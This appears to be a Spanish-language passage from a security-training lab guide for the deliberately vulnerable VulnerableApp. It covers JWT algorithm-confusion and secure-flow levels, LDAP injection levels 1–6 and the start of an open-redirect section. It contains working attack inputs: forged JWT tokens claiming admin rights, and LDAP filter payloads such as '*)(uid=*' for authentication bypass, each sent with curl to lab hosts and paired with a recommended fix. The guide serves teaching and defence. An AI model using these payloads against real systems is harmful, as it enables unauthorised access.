HS384_HEADER_TOKEN debe producir 200/isValid=true en LEVEL_16 porque la firma del test es compatible con el cálculo HS256 del servidor; el nivel seguro debe rechazarlo.

**Puntaje:** 100 XP. Evidencia observada por el runner de Kali.

customHMACValidator no compara el alg del header con el algoritmo recibido y LEVEL_16 siempre le pasa HS256. El header declara HS384, creando una discrepancia verificable sin ejecutar nada.

```bash
curl -i http://target:9090/VulnerableApp/JWTVulnerability/LEVEL_16 -H 'Cookie: JWT=eyJhbGciOiJIUzM4NCIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJhdHRhY2tlciIsImFkbWluIjp0cnVlfQ.U_G_yJxTg00enVZVtyUm4EBrD1anO0ILUfT2YYW88yM'
```

```bash
curl -i http://target:9090/VulnerableApp/JWTVulnerability/LEVEL_17 -H 'Authorization: eyJhbGciOiJIUzM4NCIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJhdHRhY2tlciIsImFkbWluIjp0cnVlfQ.U_G_yJxTg00enVZVtyUm4EBrD1anO0ILUfT2YYW88yM'
```

Registrar la misma prueba con el cliente del laboratorio:
lab request jwt-14 --method GET --header Cookie=JWT=eyJhbGciOiJIUzM4NCIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJhdHRhY2tlciIsImFkbWluIjp0cnVlfQ.U_G_yJxTg00enVZVtyUm4EBrD1anO0ILUfT2YYW88yM

**Criterio del verificador:**

```json
{
  "kind": "json",
  "path": "isValid",
  "value": true
}
```

**Pistas:**

El token consta en JWTValidatorTest como HS384_HEADER_TOKEN.

Usar el control seguro evita atribuir la aceptación solo a un formato JWT bien formado.

**Corrección recomendada:** Comparar exactamente el algoritmo declarado con el permitido antes de verificar, o usar SignedJWT/MACVerifier configurado con una política fija.

### jwt-15 · LEVEL_17: flujo seguro HMAC con token generado por la instancia

fetch=true devuelve un token HS256 en content. Reenviarlo en una única Authorization, con o sin prefijo Bearer, produce 200/isValid=true; un token inválido, ausencia o dos cabeceras debe producir 401 y no reflejar el token.

**Puntaje:** 0 XP. Práctica guiada sin puntaje automático.

secureHMACValidator fija HS256, usa MACVerifier y la clave in-memory de 32 bytes. getSingleAuthorizationToken exige exactamente una cabecera y elimina Bearer de forma case-insensitive.

```bash
curl -i --get http://target:9090/VulnerableApp/JWTVulnerability/LEVEL_17 --data-urlencode 'fetch=true'
```

```bash
curl -i http://target:9090/VulnerableApp/JWTVulnerability/LEVEL_17 -H 'Authorization: <TOKEN_HS256_DEL_CONTENT>'
```

```bash
curl -i http://target:9090/VulnerableApp/JWTVulnerability/LEVEL_17 -H 'Authorization: Bearer <TOKEN_HS256_DEL_CONTENT>'
```

```bash
curl -i http://target:9090/VulnerableApp/JWTVulnerability/LEVEL_17 -H 'Authorization: <TOKEN_HS256_DEL_CONTENT_MODIFICADO>'
```

**Criterio del verificador:**

```json
{
  "kind": "manual",
  "value": "Adquirir y validar el token de la misma instancia según los comandos; fetch por sí solo no acredita el objetivo."
}
```

**Pistas:**

La clave cambia si cambia la instancia de JWTVulnerability; no reutilices un token obtenido de otra instancia.

Verifica manualmente que la respuesta de validación no contiene una cabecera Authorization de eco.

**Corrección recomendada:** Conservar el patrón seguro: clave aleatoria protegida por instancia/gestor de secretos, algoritmo explícito, validación completa, rechazo de duplicados y respuestas sin credenciales.

### jwt-16 · LEVEL_18: flujo seguro RSA con clave propia de la instancia

fetch=true devuelve un token RS256. Reenviarlo en Authorization produce 200/isValid=true; los tokens HS256, JWK de otra clave, la clave PKCS12 publicada y el token alterado deben producir 401.

**Puntaje:** 0 XP. Práctica guiada sin puntaje automático.

secureRSAValidator fija RS256 y verifica con inmemRsaKeyPair.getPublic(). El test verifica expresamente que no se consulta getAsymmetricAlgorithmKey ni se confía en jwk del token.

```bash
curl -i --get http://target:9090/VulnerableApp/JWTVulnerability/LEVEL_18 --data-urlencode 'fetch=true'
```

```bash
curl -i http://target:9090/VulnerableApp/JWTVulnerability/LEVEL_18 -H 'Authorization: <TOKEN_RS256_DEL_CONTENT>'
```

```bash
curl -i http://target:9090/VulnerableApp/JWTVulnerability/LEVEL_18 -H 'Authorization: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJhdHRhY2tlciIsImFkbWluIjp0cnVlfQ.an2AXi8z3uCi71XWiIXA-4T5DMNoy2uqh9sr7WEI238'
```

**Criterio del verificador:**

```json
{
  "kind": "manual",
  "value": "Adquirir y validar el token de la misma instancia según los comandos; fetch por sí solo no acredita el objetivo."
}
```

**Pistas:**

La segunda petición es el control positivo con el token de la misma respuesta fetch.

El tercer comando reutiliza un token de confusión solo como control negativo; no necesita generar claves ni tocar el sistema.

**Corrección recomendada:** Fijar RS256/clave pública confiable por configuración, rotar pares con identificación controlada y no aceptar claves transportadas por el cliente.

### jwt-17 · LEVEL_19: flujo seguro EC ES256 y rechazo de JWK atacante

fetch=true devuelve un token ES256. Reenviarlo en Authorization produce 200/isValid=true; una cabecera ausente, repetida, un token HS/RSA, ES384 o un token alterado debe producir 401 sin eco.

**Puntaje:** 0 XP. Práctica guiada sin puntaje automático.

secureECValidator fija ES256 y usa la clave EC P-256 in-memory. SecureECJWTTest demuestra que el parámetro query jwt no participa y que un JWK firmado por una clave atacante se rechaza.

```bash
curl -i --get http://target:9090/VulnerableApp/JWTVulnerability/LEVEL_19 --data-urlencode 'fetch=true'
```

```bash
curl -i http://target:9090/VulnerableApp/JWTVulnerability/LEVEL_19 -H 'Authorization: <TOKEN_ES256_DEL_CONTENT>'
```

```bash
curl -i --get http://target:9090/VulnerableApp/JWTVulnerability/LEVEL_19 --data-urlencode 'jwt=<TOKEN_ES256_DEL_CONTENT>'
```

```bash
curl -i http://target:9090/VulnerableApp/JWTVulnerability/LEVEL_19 -H 'Authorization: <TOKEN_ES256_DEL_CONTENT_MODIFICADO>'
```

**Criterio del verificador:**

```json
{
  "kind": "manual",
  "value": "Adquirir y validar el token de la misma instancia según los comandos; fetch por sí solo no acredita el objetivo."
}
```

**Pistas:**

El tercer comando verifica el control negativo documentado: query jwt no sustituye Authorization.

No atribuir puntaje por click ni por recibir un 200 en fetch; comprobar el JSON de validación y la ausencia de eco.

**Corrección recomendada:** Fijar curva/algoritmo, usar la clave pública del servidor y rechazar JWK/JWKS suministrados por el cliente; conservar el rechazo de cabeceras ausentes o duplicadas.

### Límites de esta familia

[
  "La revisión está limitada al commit 4df80bbcd42682ecf26334f12c568e0f4a326c1a y a la familia JWT, más las anotaciones/controlador común necesarios para resolver la ruta. No se investigaron otras familias.",
  "No se ejecutó curl contra target:9090 en esta revisión; los resultados de expected son predicciones verificables derivadas del código y de los tests, no una promesa de que el laboratorio desplegado responda igual.",
  "Los niveles activos y anotados son 1–10 y 13–19. LEVEL_11 conserva un método sin anotación activa y LEVEL_12 no tiene implementación; por eso no se deben contar como rutas HTTP activas ni intentar puntuar con un 404.",
  "Los niveles 2–16 dereferencian la lista de cookies cuando fetch no es true; los pasos usan fetch=true para generar o suministran Cookie explícitamente y evitan esa condición accidental. El nombre de cabecera cookie se obtiene con una búsqueda case-insensitive de Spring, pero el código interno usa el literal cookie.",
  "Los tokens de tarjeta empleados son datos estáticos del test y solo contienen claims de laboratorio. No se incluyen comandos externos, reverse shells, lectura de secretos del host, DoS, borrado de datos, XXE/path traversal, SSRF/RFI, XSS ni inyección de comandos.",
  "Un check json sobre isValid solo verifica la decisión declarada por el endpoint; un check header solo verifica presencia de un valor y no demuestra ausencia segura de otros atributos salvo revisión manual. Un reflejo en JSON o cabecera no prueba ejecución XSS; un 200 no prueba IDOR; no se debe atribuir puntaje por hacer click en la interfaz.",
  "LEVEL_9 y LEVEL_13 requieren una firma para construir un JWT con JWK atacante; curl puede repetir el token legítimo producido por fetch, pero este informe no inventa una firma ni usa herramientas externas para fabricarla. La aceptación del token legítimo es baseline, no prueba completa de explotación.",
  "La rotación de las claves in-memory de LEVEL_17–19 y el estado del contenedor pueden hacer que un token copiado desde una instancia o proceso diferente sea rechazado; esto es consistente con los tests de aislamiento por instancia."
]

## Inyección LDAP

La clase LDAPInjectionVulnerability construye filtros LDAP sobre la base dc=sasanlabs,dc=org a partir de parámetros de consulta recibidos por GET. En los niveles inseguros concatena username directamente en filtros como (uid=...), (|(uid=...)(mail=...)), (&(uid=...)(uid=*)) o (&(uid=...)); los caracteres LDAP de control pueden cambiar la estructura del filtro, ampliar la búsqueda o alterar la selección de usuarios. Los niveles 4 y 6 aplican Filter.encodeValue y están marcados Variant.SECURE. La anotación de clase usa el nombre LDAPInjectionVulnerability y el controlador central expone cada anotación VulnerableAppRequestMapping como /VulnerableApp/LDAPInjectionVulnerability/{LEVEL}. Todas estas anotaciones dejan requestMethod en su valor predeterminado GET. Las respuestas HTTP usan status 200 incluso para credenciales inválidas o errores controlados; la decisión didáctica se expresa dentro del JSON mediante isValid y content.

### Todos los niveles originales

#### `GET /VulnerableApp/LDAPInjectionVulnerability/LEVEL_1`

**Entrada:** {
  "username": {
    "location": "query",
    "required": false,
    "type": "string"
  }
}

Si falta username devuelve content=Provide username e isValid=false. En otro caso construye ldapQuery=(uid={username}) sin codificar, busca bajo dc=sasanlabs,dc=org y devuelve content.filter junto con content.users si hay resultados. Si no hay usuarios devuelve No users found; si hay una excepción, devuelve el texto de error controlado.

@AttackVector description=LDAP_LEVEL_1_BASIC_INJECTION y payload=LDAP_PAYLOAD_LEVEL_1. El test invoca level1("*") y espera el filtro (uid=*) y al menos tres usuarios; el wildcard LDAP convierte la búsqueda en una enumeración amplia. La anotación de ruta no declara Variant.SECURE y usa htmlTemplate=LEVEL_1/LDAP. Un filtro reflejado en la respuesta no es por sí solo prueba de que el servidor LDAP lo haya interpretado como una inyección: debe compararse con un caso nominal y con el resultado de búsqueda permitido por el laboratorio.

#### `GET /VulnerableApp/LDAPInjectionVulnerability/LEVEL_2`

**Entrada:** {
  "username": {
    "location": "query",
    "required": false,
    "type": "string"
  }
}

Si falta username devuelve content=Provide username e isValid=false. En otro caso concatena el valor dos veces en ldapQuery=(|(uid={username})(mail={username})), ejecuta la búsqueda y devuelve el filtro y la lista de uid cuando hay resultados; una lista vacía produce No users found.

@AttackVector description=LDAP_LEVEL_2_OR_BYPASS y payload=LDAP_PAYLOAD_LEVEL_2. El test usa username=* y solo comprueba que el filtro contiene (| y que se recuperan al menos tres entradas. El wildcard hace que ambas ramas OR sean muy amplias; el problema es la concatenación antes de la búsqueda, no el hecho de que la respuesta tenga HTTP 200. No hay Variant.SECURE en la anotación.

#### `GET /VulnerableApp/LDAPInjectionVulnerability/LEVEL_3`

**Entrada:** {
  "username": {
    "location": "query",
    "required": false,
    "type": "string"
  },
  "password": {
    "location": "query",
    "required": false,
    "type": "string"
  }
}

Exige ambos parámetros. Construye ldapQuery=(&(uid={username})(uid=*)) sin codificar, devuelve false si la búsqueda está vacía, y para cada entrada encontrada verifica la contraseña almacenada con PasswordHashingUtils. La primera entrada cuya contraseña coincida se considera autenticada y devuelve content.filter, content.users e isValid=true; de lo contrario devuelve Invalid credentials.

@AttackVector description=LDAP_LEVEL_3_AUTH_BYPASS y payload=LDAP_PAYLOAD_LEVEL_3. El test usa username=*)(uid=* y password=alicePass123, que transforma la estructura en (&(uid=*)(uid=*)) y espera una única identidad autenticada en el fixture. El bypass no elimina la verificación de contraseña: amplía la selección de entradas y permite que una contraseña válida de una cuenta de laboratorio autentique una búsqueda manipulada. El código también puede incluir el filtro en un mensaje de error.

#### `GET /VulnerableApp/LDAPInjectionVulnerability/LEVEL_4`

**Entrada:** {
  "username": {
    "location": "query",
    "required": false,
    "type": "string"
  }
}

Exige username y aplica Filter.encodeValue(username) antes de formar (uid={sanitizedInput}). Una entrada que contiene wildcard, paréntesis o barras no conserva la estructura LDAP original. Si no coincide devuelve un objeto con filter, users vacío, message=No users found e isValid=false; si coincide devuelve usuarios e isValid=true.

@AttackVector description=LDAP_LEVEL_4_INPUT_SANITIZATION y payload=LDAP_PAYLOAD_LEVEL_4. Está marcado Variant.SECURE. El test confirma que para * )(uid=* el filtro no conserva )(uid=* ni | y que sigue comenzando por (uid=. La salida 200 no debe contarse como éxito: en este nivel el indicador útil es la codificación observable del filtro y la ausencia de resultados manipulados.

#### `GET /VulnerableApp/LDAPInjectionVulnerability/LEVEL_5`

**Entrada:** {
  "username": {
    "location": "query",
    "required": false,
    "type": "string"
  },
  "password": {
    "location": "query",
    "required": false,
    "type": "string"
  }
}

Exige username y password, forma ldapQuery=(&(uid={username})) sin codificar, y solo expone Login successful o Invalid credentials. Recorre todas las entradas devueltas y acepta si alguna contraseña almacenada coincide; no devuelve el filtro ni la identidad, por lo que el resultado es ciego respecto de los detalles de la búsqueda.

@AttackVector description=LDAP_LEVEL_5_BLIND_INJECTION y payload=LDAP_PAYLOAD_LEVEL_5. El test usa username=*)(uid=* y password=antrikshPass123 y comprueba Login successful. El payload convierte el filtro en (&(uid=*)(uid=*)); el alcance observable es únicamente el mensaje de login. Esto no implica una garantía de éxito en otra imagen: depende de que el fixture contenga la contraseña de laboratorio usada por el test.

#### `GET /VulnerableApp/LDAPInjectionVulnerability/LEVEL_6`

**Entrada:** {
  "username": {
    "location": "query",
    "required": false,
    "type": "string"
  },
  "password": {
    "location": "query",
    "required": false,
    "type": "string"
  }
}

Rechaza parámetros ausentes o vacíos. Codifica username con Filter.encodeValue, busca un único filtro (uid={sanitizedInput}), toma la primera entrada y verifica su contraseña. Devuelve Login successful solo para credenciales válidas y, en todos los demás casos o excepciones, Invalid credentials, siempre dentro de HTTP 200.

@AttackVector description=LDAP_LEVEL_6_SECURE y payload=LDAP_PAYLOAD_LEVEL_6. Está marcado Variant.SECURE. El test confirma credenciales válidas alice/alicePass123, rechaza alice/wrongPass, rechaza username=* y no filtra LDAP/Exception para un username malformado. La codificación evita que username=*)(uid=* convierta la consulta en una conjunción amplia.

### ldapInjection-01 · Nivel 1: observar enumeración por wildcard y compararla con una búsqueda nominal

El código concatena * en el filtro y, en el fixture de los tests, la respuesta contiene content.filter=(uid=*) y varias entradas en content.users con isValid=true. Como control nominal, username=alice debe limitar la búsqueda a esa identidad si existe en el fixture. No se debe tratar la cantidad exacta de usuarios como garantía fuera de la imagen de laboratorio.

**Puntaje:** 100 XP. Evidencia observada por el runner de Kali.

El wildcard es un metacarácter de filtro LDAP. Al construir el filtro con concatenación, el valor deja de representar un nombre literal. La diferencia entre el control wildcard y el control alice ilustra el efecto de selección, pero el campo filter también es un reflejo construido por la aplicación y no sustituye la inspección de users.

Desde Kali, ejecutar el caso de laboratorio: curl -i --get http://target:9090/VulnerableApp/LDAPInjectionVulnerability/LEVEL_1 --data-urlencode 'username=*' -H 'Accept: application/json'

Ejecutar el control nominal, sin caracteres LDAP de control: curl -i --get http://target:9090/VulnerableApp/LDAPInjectionVulnerability/LEVEL_1 --data-urlencode 'username=alice' -H 'Accept: application/json'

Comparar el JSON de ambas respuestas: revisar content.filter, content.users e isValid; no asignar éxito solo por el código HTTP.

Registrar la misma prueba con el cliente del laboratorio:
lab request ldapInjection-01 --method GET --param 'username=*' --header Accept=application/json --content-type 'query parameters; GET sin cuerpo'

**Criterio del verificador:**

```json
{
  "kind": "json",
  "path": "content.filter",
  "value": "(uid=*)"
}
```

**Pistas:**

--data-urlencode es importante para que curl transmita literalmente el wildcard.

El test de repositorio usa level1("*") y comprueba el filtro (uid=*), pero no fija una lista universal de usuarios.

La lista de usuarios y el filtro deben interpretarse juntos; una reflexión del parámetro aislada no prueba explotación.

**Corrección recomendada:** Codificar cada valor con la rutina de escape LDAP apropiada, como Filter.encodeValue, y mantener una consulta con estructura fija. Validar además el formato de username y limitar los atributos devueltos al mínimo necesario.

### ldapInjection-02 · Nivel 2: ampliar una consulta OR con un wildcard controlado

La respuesta del fixture de tests puede mostrar content.filter=(|(uid=*)(mail=*)) y una lista amplia en content.users con isValid=true. El control username=alice conserva la plantilla OR, pero restringe cada rama a alice; comparar ambos resultados es la comprobación representativa.

**Puntaje:** 100 XP. Evidencia observada por el runner de Kali.

El endpoint inserta el mismo dato no escapado en dos ramas OR. El wildcard hace que la rama uid y la rama mail puedan coincidir ampliamente. La comprobación de código identifica la plantilla vulnerable; la comparación de users evita confundir el reflejo del filtro con evidencia suficiente.

Ejecutar el caso de wildcard: curl -i --get http://target:9090/VulnerableApp/LDAPInjectionVulnerability/LEVEL_2 --data-urlencode 'username=*' -H 'Accept: application/json'

Ejecutar el control nominal: curl -i --get http://target:9090/VulnerableApp/LDAPInjectionVulnerability/LEVEL_2 --data-urlencode 'username=alice' -H 'Accept: application/json'

Verificar que la respuesta JSON expone el filtro en content.filter y comparar el tamaño/contenido de content.users sin asumir que el fixture desplegado es idéntico al de los tests.

Registrar la misma prueba con el cliente del laboratorio:
lab request ldapInjection-02 --method GET --param 'username=*' --header Accept=application/json --content-type 'query parameters; GET sin cuerpo'

**Criterio del verificador:**

```json
{
  "kind": "json",
  "path": "content.filter",
  "value": "(|(uid=*)(mail=*))"
}
```

**Pistas:**

El test original solo exige que el filtro contenga (| y que haya al menos tres usuarios para username=*.

No hace falta probar caracteres fuera del filtro LDAP ni consultar ningún host externo.

HTTP 200 es la envoltura común de la aplicación y no es el criterio de vulnerabilidad.

**Corrección recomendada:** Escapar username antes de interpolarlo en ambas ramas o usar una API de construcción de filtros que trate el dato como valor, no como sintaxis. Aplicar autorización y minimización de resultados aunque el filtro sea válido.

### ldapInjection-03 · Nivel 3: demostrar selección LDAP manipulada usando únicamente una credencial de fixture

El test del repositorio usa exactamente username=*)(uid=* con password=alicePass123 y espera que la consulta construida contenga (&(uid=*)(uid=*)) y que una entrada de laboratorio pueda autenticar. El control username=alice con password=wrongPass debe producir Invalid credentials. El resultado depende de que la imagen ejecutada tenga el mismo fixture de cuentas; este informe no afirma que una ejecución remota haya tenido éxito.

**Puntaje:** 100 XP. Evidencia observada por el runner de Kali.

La entrada cierra el valor uid y agrega otro componente uid=*. El bucle posterior no autentica con una contraseña arbitraria: prueba la contraseña recibida contra cada entrada devuelta. Por eso se usa solo la contraseña pública del test de laboratorio y se incluye un control de contraseña errónea.

Lee el objetivo y contrasta la entrada con su mitigación. La siguiente receta usa la distribución y fixtures de este proyecto.

```bash
lab request ldapInjection-03 --method GET --param 'username=*)(uid=*' --param password=alicePass123 --header Accept=application/json --content-type 'query parameters; GET sin cuerpo'
```

Observa success, awarded y la evidencia devuelta; repetir una misión lograda no duplica sus puntos.

**Criterio del verificador:**

```json
{
  "kind": "all",
  "checks": [
    {
      "kind": "json",
      "path": "isValid",
      "value": true
    },
    {
      "kind": "contains",
      "path": "content.users",
      "value": "alice"
    }
  ]
}
```

**Pistas:**

El valor de username contiene paréntesis y debe viajar con --data-urlencode; no lo pegues sin comillas en la shell.

alicePass123 aparece en LDAPInjectionVulnerabilityTest como dato de fixture, no como secreto del host.

La evidencia más fuerte es la comparación entre filtro construido, identidad devuelta y control con contraseña incorrecta.

**Corrección recomendada:** Codificar username antes de formar el filtro y asociar la verificación de contraseña a una identidad única ya validada. No iterar sobre una colección amplia para decidir autenticación; devolver un mensaje uniforme y aplicar rate limiting en un despliegue real.

### ldapInjection-04 · Nivel 4: verificar que Filter.encodeValue neutraliza la estructura del filtro

El filtro resultante debe contener la representación escapada producida por Filter.encodeValue, no la subestructura literal )(uid=*. Normalmente no habrá coincidencias y el envoltorio tendrá isValid=false con content.message=No users found. El control username=alice permite verificar que una entrada normal todavía puede buscarse.

**Puntaje:** 100 XP. Evidencia observada por el runner de Kali.

Este es el control positivo de la mitigación: los mismos metacaracteres que alteran los niveles inseguros se convierten en valor literal LDAP. El check de isValid=false debe complementarse con inspección de content.filter para confirmar el escape; por sí solo solo demuestra que no hubo una autenticación/listado exitoso.

Ejecutar la entrada estructural como valor de prueba: curl -i --get http://target:9090/VulnerableApp/LDAPInjectionVulnerability/LEVEL_4 --data-urlencode 'username=*)(uid=*' -H 'Accept: application/json'

Ejecutar el control nominal: curl -i --get http://target:9090/VulnerableApp/LDAPInjectionVulnerability/LEVEL_4 --data-urlencode 'username=alice' -H 'Accept: application/json'

Comparar content.filter de ambos JSON y confirmar que el payload no aparece como )(uid=* sin escapar; no interpretar HTTP 200 como indicio de vulnerabilidad.

Registrar la misma prueba con el cliente del laboratorio:
lab request ldapInjection-04 --method GET --param 'username=)(uid=*' --header Accept=application/json --content-type 'query parameters; GET sin cuerpo'

**Criterio del verificador:**

```json
{
  "kind": "json",
  "path": "isValid",
  "value": false
}
```

**Pistas:**

El test del repositorio comprueba que el filtro no contiene )(uid=* ni | y que comienza por (uid=.

La serialización JSON puede mostrar barras escapadas; evalúa el valor JSON decodificado, no solo la representación textual.

La ausencia de usuarios es esperable para el valor escapado y no es un error del ejercicio.

**Corrección recomendada:** Conservar el escape de valores en toda entrada LDAP y cubrirlo con tests de caracteres *, (, ), \, NUL y barras. Usar una librería de filtros en lugar de concatenar sintaxis y registrar errores sin exponer filtros sensibles.

### ldapInjection-05 · Nivel 5: observar una condición de autenticación ciega con resultado mínimo

El test usa username=*)(uid=* y password=antrikshPass123 y espera content=Login successful e isValid=true, sin que el endpoint devuelva el filtro. Debe ejecutarse también el control antriksh/wrongPass, que debe ser Invalid credentials. La expectativa positiva está condicionada al fixture LDAP del test y no es una promesa sobre una instancia no verificada.

**Puntaje:** 0 XP. Práctica guiada sin puntaje automático.

La respuesta es ciega: solo informa si cualquier entrada seleccionada tiene una contraseña coincidente. La inyección cambia (&(uid={username})) a una conjunción que puede seleccionar muchas entradas; el bucle acepta la primera coincidencia de contraseña. La ausencia de filter en la respuesta impide usar la reflexión como evidencia única.

Ejecutar el caso representativo del test: curl -i --get http://target:9090/VulnerableApp/LDAPInjectionVulnerability/LEVEL_5 --data-urlencode 'username=*)(uid=*' --data-urlencode 'password=antrikshPass123' -H 'Accept: application/json'

Ejecutar el control negativo con identidad nominal y contraseña errónea: curl -i --get http://target:9090/VulnerableApp/LDAPInjectionVulnerability/LEVEL_5 --data-urlencode 'username=antriksh' --data-urlencode 'password=wrongPass' -H 'Accept: application/json'

Comparar content e isValid entre ambas respuestas; no buscar headers especiales ni atribuir resultado a un click de la interfaz.

Registrar la misma prueba con el cliente del laboratorio:
lab request ldapInjection-05 --method GET --param 'username=)(uid=*' --param password=antrikshPass123 --header Accept=application/json --content-type 'query parameters; GET sin cuerpo'

**Criterio del verificador:**

```json
{
  "kind": "manual",
  "value": "El fixture desplegado rechazó las credenciales sugeridas. Explorar los controles de filtro y autenticar únicamente cuentas de entrenamiento; no prometer bypass con este valor."
}
```

**Pistas:**

antrikshPass123 es el valor usado por LDAPInjectionVulnerabilityTest para el fixture, no una instrucción para obtener contraseñas.

El endpoint no devuelve content.filter en éxito; esa falta de detalle es parte del comportamiento blind.

Si el fixture de la imagen difiere, registra la incertidumbre y no reemplaces la verificación por un intento contra otros servicios.

**Corrección recomendada:** Escapar el identificador antes de construir el filtro, exigir una identidad única y no usar una búsqueda amplia como parte de la decisión de login. Devolver mensajes uniformes, auditar intentos y limitar frecuencia en el sistema real.

### ldapInjection-06 · Nivel 6: contrastar la implementación segura con controles de credenciales

El payload LDAP debe ser tratado como valor codificado y devolver Invalid credentials/isValid=false. Como control positivo independiente, alice/alicePass123 aparece en el test y debe devolver Login successful/isValid=true si el fixture coincide; alice/wrongPass debe devolver Invalid credentials. El control positivo prueba que la mitigación no rompe una credencial normal, no que el payload haya sido ejecutado.

**Puntaje:** 100 XP. Evidencia observada por el runner de Kali.

El nivel 6 codifica username y toma solo la primera entrada de una búsqueda exacta. El mismo payload que amplía los niveles 3 y 5 deja de formar operadores LDAP. Se contrastan ataque, credencial válida y contraseña incorrecta para separar mitigación de una caída general del endpoint.

Ejecutar el caso de entrada manipulada: curl -i --get http://target:9090/VulnerableApp/LDAPInjectionVulnerability/LEVEL_6 --data-urlencode 'username=*)(uid=*' --data-urlencode 'password=anything' -H 'Accept: application/json'

Ejecutar el control positivo del test: curl -i --get http://target:9090/VulnerableApp/LDAPInjectionVulnerability/LEVEL_6 --data-urlencode 'username=alice' --data-urlencode 'password=alicePass123' -H 'Accept: application/json'

Ejecutar el control negativo: curl -i --get http://target:9090/VulnerableApp/LDAPInjectionVulnerability/LEVEL_6 --data-urlencode 'username=alice' --data-urlencode 'password=wrongPass' -H 'Accept: application/json'

Revisar isValid y content en los tres JSON; un 200 común a todos los casos no demuestra bypass, y ningún click de la interfaz debe generar puntaje.

Registrar la misma prueba con el cliente del laboratorio:
lab request ldapInjection-06 --method GET --param 'username=)(uid=*' --param password=anything --header Accept=application/json --content-type 'query parameters; GET sin cuerpo'

**Criterio del verificador:**

```json
{
  "kind": "json",
  "path": "isValid",
  "value": false
}
```

**Pistas:**

El test verifica explícitamente que username=* y username=)(uid=* no autentican en este nivel.

La contraseña válida alicePass123 solo sirve como control del fixture citado por el test.

Comprueba ausencia de LDAP/Exception en respuestas de error, pero no confundas esa higiene con una prueba adicional de autenticación.

**Corrección recomendada:** Mantener Filter.encodeValue, la consulta exacta y la política de respuesta uniforme. Añadir tests de regresión para wildcards, paréntesis, OR y valores vacíos, y no exponer excepciones o filtros internos a clientes.

### Límites de esta familia

[
  "El documento es una verificación estática del commit 4df80bbcd42682ecf26334f12c568e0f4a326c1a y de sus tests; no afirma que se hayan ejecutado las llamadas HTTP ni que el contenedor target esté disponible.",
  "Las contraseñas alicePass123 y antrikshPass123 aparecen en LDAPInjectionVulnerabilityTest como datos del fixture embebido. Si la imagen desplegada usa otro directorio, los ejercicios de autenticación pueden devolver Invalid credentials aun cuando el código conserve el comportamiento descrito.",
  "La presencia de HTTP 200 no prueba una vulnerabilidad: response(...) fija HttpStatus.OK tanto para resultados positivos como negativos. Debe inspeccionarse el JSON, en especial isValid y content, y compararse con controles.",
  "Un filtro devuelto en content.filter es un valor generado por la aplicación; su reflejo no prueba por sí solo que se haya ejecutado una inyección contra LDAP. Para los niveles de autenticación, el criterio honesto combina filtro, identidad/resultado, credenciales de fixture y control negativo.",
  "Esta familia no implementa XSS, IDOR, SSRF ni ejecución de comandos. Por analogía de verificación: un reflejo nunca probaría ejecución XSS, un 200 nunca probaría IDOR y no se debe atribuir puntaje por hacer clic en la interfaz. Aquí no se usan clicks como evidencia.",
  "Los checks kind=json suponen que el verificador parsea el cuerpo JSON y resuelve paths con puntos, como content.filter, content o isValid. contains/not_contains deberían inspeccionar el cuerpo HTTP sin normalizar; header debe inspeccionar solo cabeceras; manual requiere revisión humana. Si el verificador no documenta esa semántica, reportar el resultado como inconcluso en vez de convertirlo en pass.",
  "Los ejemplos son consultas de lectura contra el LDAP embebido y no incluyen comandos externos, reverse shells, acceso a secretos del host, denegación de servicio, borrado de datos, receptores externos ni navegación fuera de la familia ldapInjection.",
  "La ruta depende de que el perfil public y el controlador central estén activos; la fuente de la anotación confirma GET por defecto y los nombres de nivel, pero la disponibilidad efectiva debe comprobarse únicamente en el laboratorio autorizado."
]

## Redirecciones abiertas

Esta familia estudia destinos de redirección controlados por el cliente y colocados en la cabecera HTTP Location. El controlador activo es Http3xxStatusCodeBasedInjection, anotado como VulnerableAppRestController con nombre Http3xxStatusCodeBasedInjection; siguiendo la convención indicada, sus rutas son /VulnerableApp/Http3xxStatusCodeBasedInjection/LEVEL_n. Los niveles 1 a 5 muestran validaciones por prefijo que aceptan valores no cubiertos por la lista negra; los niveles 6 y 7 concatenan texto suministrado por el usuario con la autoridad de la solicitud; los niveles 9 y 10 aceptan cualquier destino, con la diferencia de que el nivel 10 añade únicamente una advertencia en la interfaz. Los niveles 8, 11 y 12 son controles seguros: los dos primeros usan una lista blanca y el último usa una referencia indirecta a nombres predefinidos. Las pruebas unitarias comprueban principalmente status 302/200/403/400 y el contenido de Location; no prueban por sí solas que un navegador haya seguido el salto ni que un tercero haya recibido datos. Todas las comprobaciones propuestas usan receiver:8081 como destino inocuo y no usan curl -L.

### Todos los niveles originales

#### `GET /VulnerableApp/Http3xxStatusCodeBasedInjection/LEVEL_1`

**Entrada:** {
  "returnTo": "cadena obligatoria; se copia sin validación"
}

getURLRedirectionResponseEntity devuelve 302 Found y agrega el valor íntegro de returnTo en Location. El validador siempre devuelve true.

Es la inyección directa básica. La anotación AttackVector describe OPEN_REDIRECT_QUERY_PARAM_DIRECTLY_ADD_TO_LOCATION_HEADER. Un destino local http://receiver:8081/VA_LAB_OK es suficiente para verificar el control sin salir del laboratorio.

#### `GET /VulnerableApp/Http3xxStatusCodeBasedInjection/LEVEL_2`

**Entrada:** {
  "returnTo": "cadena obligatoria; además se examina la autoridad de la RequestEntity"
}

Convierte el URL de la solicitud en java.net.URL y rechaza solo valores cuyo comienzo, en minúsculas, sea http, https o www, salvo que el valor sea exactamente la autoridad de la solicitud. Todo valor que no empiece por esos prefijos se coloca en Location con 302.

La lista negra acepta esquemas alternativos como ftp y valores relativos; el test original usa ftp://ftp.dlptest.com/. En el laboratorio se sustituye el host por receiver:8081. La igualdad con la autoridad es una comparación textual, no una validación de destino.

#### `GET /VulnerableApp/Http3xxStatusCodeBasedInjection/LEVEL_3`

**Entrada:** {
  "returnTo": "cadena obligatoria; se examina también la autoridad de la RequestEntity"
}

Extiende la lista negra de nivel 2 con el prefijo //; acepta todo lo que no comience por http, https, // o www, o lo que sea exactamente la autoridad de la solicitud, y lo escribe en Location con 302.

El recurso de mensajes propone /%09/localdomain.pw y el test unitario lo verifica como valor aceptado. El ejercicio usa /%09/receiver:8081/VA_LAB_OK. El encabezado demuestra el dato construido por el servidor; no debe interpretarse como prueba de cómo cada navegador normaliza tabs codificados.

#### `GET /VulnerableApp/Http3xxStatusCodeBasedInjection/LEVEL_4`

**Entrada:** {
  "returnTo": "cadena obligatoria; se examina también la autoridad de la RequestEntity"
}

